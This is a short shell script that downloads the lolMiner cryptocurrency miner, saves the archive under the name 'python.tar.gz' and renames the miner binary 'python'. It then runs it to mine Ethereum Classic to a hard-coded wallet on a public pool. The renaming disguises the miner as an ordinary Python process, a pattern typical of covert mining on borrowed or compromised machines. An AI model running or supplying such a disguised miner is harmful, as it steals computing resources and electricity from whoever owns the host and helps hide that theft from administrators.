curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.34/lolMiner_v1.34_Lin64.tar.gz
tar -zxvf python.tar.gz
cd 1.34
mv lolMiner python
./python --coin ETC --pool us-etc.2miners.com:1010 --user 0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b.GPU
